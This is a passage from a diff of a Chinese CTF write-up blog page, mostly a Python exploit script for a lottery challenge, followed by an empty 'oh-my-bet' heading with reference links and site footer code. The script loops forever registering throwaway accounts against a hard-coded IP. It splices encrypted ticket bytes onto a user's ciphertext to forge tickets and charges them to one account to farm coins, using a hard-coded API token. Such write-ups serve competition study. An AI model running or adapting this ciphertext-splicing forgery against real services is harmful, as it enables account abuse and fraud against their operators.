+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">random</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span>
+
+<span class="n">user_token</span> <span class="o">=</span> <span class="s2">&#34;Yu5PGq2I0jhZssXttlEaiBkNQXRrxzbD&#34;</span>
+<span class="n">user_uuid</span> <span class="o">=</span> <span class="s2">&#34;ae4774be-2e44-49d2-82dc-6c69c57c4378&#34;</span>
+<span class="n">user_enc</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;+Zza7U18mMFaHhYyrTaOr\/IubODmR8QF1yC01+0XIg3Ea0s5evdcMwcHHNovcM3pytuj4wsD2NFsMv1g+yjXfyEFlnH5hTkHnLKzkFc0dmHqydlPZNnijH8cHjiFVPKU4tKa3tbXh1v0ZTejYwnrwjeWiY89xrpsXSMn2CEt8bM=&#34;</span>
+
+<span class="n">cookie</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s2">&#34;api_token&#34;</span><span class="p">:</span> <span class="n">user_token</span>
+<span class="p">}</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://52.149.144.45:8080&#34;</span>
+
+<span class="k">def</span> <span class="nf">get_random</span><span class="p">():</span>
+    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">sample</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span><span class="p">,</span> <span class="mi">10</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
+    <span class="n">username</span><span class="o">=</span><span class="n">get_random</span><span class="p">()</span>
+    <span class="n">data</span><span class="o">=</span> <span class="p">{</span>
+            <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
+            <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;asdasd&#34;</span>
+    <span class="p">}</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;/user/register&#34;</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">d</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+    
+    <span class="k">return</span> <span class="n">username</span>
+
+<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s2">&#34;asdasd&#34;</span><span class="p">):</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
+        <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="n">password</span>
+    <span class="p">}</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;/user/login&#34;</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+    <span class="n">d</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">d</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">][</span><span class="s1">&#39;api_token&#39;</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">info</span><span class="p">(</span><span class="n">api_token</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;/user/info?api_token=&#34;</span> <span class="o">+</span> <span class="n">api_token</span><span class="p">)</span>
+    <span class="n">d</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;uuid: &#39;</span><span class="o">+</span><span class="n">d</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">][</span><span class="s1">&#39;uuid&#39;</span><span class="p">])</span>
+
+<span class="k">def</span> <span class="nf">buy</span><span class="p">(</span><span class="n">api_key</span><span class="p">):</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&#34;api_token&#34;</span><span class="p">:</span> <span class="n">api_key</span>
+    <span class="p">}</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;/lottery/buy&#34;</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+    <span class="c1">#print(res.text)</span>
+    <span class="n">d</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">d</span><span class="p">[</span><span class="s1">&#39;enc&#39;</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">get_enc</span><span class="p">(</span><span class="n">enc</span><span class="p">):</span>
+    <span class="n">o</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>
+    <span class="n">u</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">user_enc</span><span class="p">)</span>
+    <span class="n">m</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">o</span><span class="p">[:</span><span class="mi">64</span><span class="p">]</span> <span class="o">+</span> <span class="n">u</span><span class="p">[</span><span class="mi">32</span><span class="p">:])</span>
+    <span class="k">print</span><span class="p">(</span><span class="s1">&#39;enc: &#39;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">quote</span><span class="p">(</span><span class="n">m</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">m</span>
+
+<span class="k">def</span> <span class="nf">charge</span><span class="p">(</span><span class="n">enc</span><span class="p">):</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+        <span class="s2">&#34;user&#34;</span><span class="p">:</span> <span class="n">user_uuid</span><span class="p">,</span>
+        <span class="s2">&#34;enc&#34;</span><span class="p">:</span> <span class="n">enc</span><span class="p">,</span>
+        <span class="s2">&#34;coin&#34;</span><span class="p">:</span> <span class="s2">&#34;7&#34;</span>
+    <span class="p">}</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s2">&#34;/lottery/charge&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookie</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;charge: &#34;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">username</span> <span class="o">=</span> <span class="n">register</span><span class="p">()</span>
+            <span class="n">api_token</span> <span class="o">=</span> <span class="n">login</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
+            <span class="n">enc</span> <span class="o">=</span> <span class="n">buy</span><span class="p">(</span><span class="n">api_token</span><span class="p">)</span>
+            <span class="n">info</span><span class="p">(</span><span class="n">api_token</span><span class="p">)</span>
+            <span class="n">mo_enc</span> <span class="o">=</span> <span class="n">get_enc</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>
+            <span class="n">charge</span><span class="p">(</span><span class="n">mo_enc</span><span class="p">)</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="k">pass</span>
+</code></pre></div><p>JrXnm师傅tql，膜</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210119144130.png" alt=""  /></p>
+<h3 id="oh-my-bet">oh-my-bet</h3>
+<p>考点：</p>
+<p>参考：</p>
+<blockquote>
+<p><a class="link" href="https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&amp;mid=2247485857&amp;idx=1&amp;sn=1cf534df42999d5126fc3cf3b7fc8f9b&amp;chksm=fd711cecca0695faf313845fb30671cd61feee2a62ad9b13f213d4de7a5b64c0dfbb6d2ac31f&amp;mpshare=1&amp;scene=23&amp;srcid=0119de31ZoFyjJWQIqWvKnuh&amp;sharer_sharetime=1611032814136&amp;sharer_shareid=8b035134b7fe8a8160582bb9a2551229#rd"  target="_blank" rel="noopener"
+    >*CTF Writeup by 星盟</a></p>
+<p><a class="link" href="https://bbs.pediy.com/thread-259355.htm"  target="_blank" rel="noopener"
+    >对称加密与攻击案例分析</a></p>
+</blockquote>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+</aside>
+
+
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "wh1sper" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2019 - 
+        
+        2021 wh1sper
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.2.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
